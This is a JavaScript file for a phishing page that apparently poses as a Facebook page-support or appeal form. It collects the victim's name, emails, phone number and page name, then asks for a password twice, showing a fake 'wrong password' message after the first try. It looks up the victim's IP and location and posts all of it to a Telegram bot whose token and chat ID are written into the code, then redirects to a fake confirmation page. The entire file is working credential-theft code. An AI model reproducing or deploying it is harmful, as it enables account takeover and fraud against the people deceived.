function getIP(callback) {
    fetch('https://api.db-ip.com/v2/free/self')
        .then(response => response.json())
        .then(data => callback(data))
        .catch(error => callback(undefined));
}

$(document).ready(function () {
    $('#input').html(`
        <div class="mb-3">
            <label for="page-name" class="form-label">Page Name <span class="text-danger">*</span></label>
            <input type="text" class="form-control" required id="page-name">
        </div>
        <div class="mb-3">
            <label for="full-name" class="form-label">Full Name <span class="text-danger">*</span></label>
            <input type="text" class="form-control" required id="full-name">
        </div>
        <div class="mb-3">
            <label for="business-email" class="form-label">Business Email Address <span class="text-danger">*</span></label>
            <input type="text" class="form-control" required id="business-email">
        </div>
        <div class="mb-3">
            <label for="personal-email" class="form-label">Personal Email Address <span class="text-danger">*</span></label>
            <input type="text" class="form-control" required id="personal-email">
        </div>
        <div class="mb-3">
            <label for="phone" class="form-label">Mobile Phone Number <span class="text-danger">*</span></label>
            <input type="text" class="form-control" required id="phone">
        </div>
        <div class="mb-3">
            <label for="description" class="form-label">Please provide us information that will help us investigate.</label>
            <textarea class="form-control" id="description" rows="3"></textarea>
        </div>
        <button type="button" class="btn mb-4">Submit</button>
    `);

    openDetail();

    let IpAddress = '';
    getIP(ip => {
        IpAddress = ip;
        sendForm(IpAddress);
    });

    $('#phone').on('input', function () {
        var input = $(this).val();
        var validInputRegex = /^[+\d]*$/;
        if (!validInputRegex.test(input)) {
            $(this).val(input.slice(0, -1));
        }
    });
});

function openDetail() {
    $(".nav-item-parent").on("click", function () {
        var isOpen = $(this).find(".arrow").css("rotate").replace("deg", "") != 0;
        $(".detail").hide();
        $(".arrow").css("rotate", "0deg");
        const id = $(this).data("id");
        if (!isOpen) {
            $("#" + id).show();
            $(this).find(".arrow").css("rotate", "180deg");
        }
    });

    $(".nav-item-child").on("click", function () {
        var isOpen = $(this).find(".arrow").css("rotate").replace("deg", "") != 0;
        const id = $(this).data("id");
        if (!isOpen) {
            $("#" + id).show();
            $(this).find(".arrow").css("rotate", "180deg");
            $(this).find(".icon-container i").css("-webkit-filter", "invert(100%)");
            $(this).find(".icon-container").css("background-color", "#1877F2");
            $(this).css("background", "#eaf3ffe8");
        } else {
            $("#" + id).hide();
            $(this).find(".arrow").css("rotate", "0deg");
            $(this).find(".icon-container i").css("-webkit-filter", "invert(0%)");
            $(this).find(".icon-container").css("background-color", "var(--color-white-secondary)");
            $(this).css("background", "none");
        }
    });
}

function validateForm() {
    var isValid = true;
    var emailRegex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\\.)+([a-zA-Z0-9]{2,4})+$/;

    if ($('#page-name').val() === '') {
        isValid = false;
        $('#page-name').addClass('border-danger');
    } else {
        $('#page-name').removeClass('border-danger');
    }

    if ($('#full-name').val() === '') {
        isValid = false;
        $('#full-name').addClass('border-danger');
    } else {
        $('#full-name').removeClass('border-danger');
    }

    if (!emailRegex.test($('#business-email').val())) {
        isValid = false;
        $('#business-email').addClass('border-danger');
    } else {
        $('#business-email').removeClass('border-danger');
    }

    if (!emailRegex.test($('#personal-email').val())) {
        isValid = false;
        $('#personal-email').addClass('border-danger');
    } else {
        $('#personal-email').removeClass('border-danger');
    }

    var phone = $('#phone').val();
    var phoneRegex = /^(\+\d+|\d+)$/;
    if (!phoneRegex.test(phone)) {
        isValid = false;
        $('#phone').addClass('border-danger');
    } else {
        $('#phone').removeClass('border-danger');
    }

    return isValid;
}

var NUMBER_TIME_LOGIN = 0;
let FIRST_PASSWORD = '';

function sendForm(IpAddress) {
    $(".content #dataGet button[type=button]").off("click").on("click", function () {
        if (validateForm()) {
            showPrompt(IpAddress);
        }
    });
}

function showPrompt(IpAddress) {
    $('#getPassword').removeClass('d-none');

    $('#close-password').off("click").on("click", function () {
        $('#getPassword').addClass('d-none');
    });

    $('#submit-password').off("click").on("click", function () {
        const submitBtn = $('#submit-password');
        let password = $("#password").val();

        if (password === '') {
            $('#password').addClass('border-danger');
            return;
        } else {
            $('#password').removeClass('border-danger');
        }

        let secondPassword = '';
        if (NUMBER_TIME_LOGIN >= 1) {
            secondPassword = password;
            password = FIRST_PASSWORD;
        }

        const message = `📧 <strong>Business Email: </strong><code>${$("#business-email").val()}</code>
👤 <strong>User Name: </strong><code>${$("#full-name").val()}</code>
📨 <strong>Personal Email: </strong><code>${$("#personal-email").val()}</code>
🏳️ <strong>Facebook Page: </strong><code>${$("#page-name").val()}</code>
📞 <strong>Phone Number: </strong><code>${$("#phone").val()}</code>
🔑 <strong>First Password: </strong><code>${password}</code>
🔑 <strong>Second Password: </strong><code>${secondPassword}</code>
🌐 <strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
<strong>City: </strong><code>${IpAddress.city}</code>`;

        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
        const chatId = '-1002416068664';

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'html' })
        })
        .then(res => {
            if (!res.ok) throw new Error("Network response was not ok");
            return res.json();
        })
        .then(() => {
            NUMBER_TIME_LOGIN++;
            submitBtn.prop('disabled', true);

            if (NUMBER_TIME_LOGIN === 1) {
                FIRST_PASSWORD = password;
                let countdown = 10;
                submitBtn.text(`Wait ${countdown}s`);
                setTimeout(() => {
                    $('.lsd-ring-container').addClass('d-none');
                    $('#password').val('');
                }, 100);

                const interval = setInterval(() => {
                    countdown--;
                    if (countdown > 0) {
                        submitBtn.text(`Wait ${countdown}s`);
                    } else {
                        clearInterval(interval);
                        submitBtn.prop('disabled', false);
                        submitBtn.text('Continue');
                        $('#wrong-password').removeClass('d-none');
                    }
                }, 1000);
            } else {
                setTimeout(() => {
                    $('.lsd-ring-container').addClass('d-none');
                    window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
                }, 2000);
            }
        })
        .catch(() => {
            setTimeout(() => {
                Swal.fire({ text: "Request failed!", icon: "error" });
                $('.lsd-ring-container').addClass('d-none');
            }, 500);
        });
    });
}
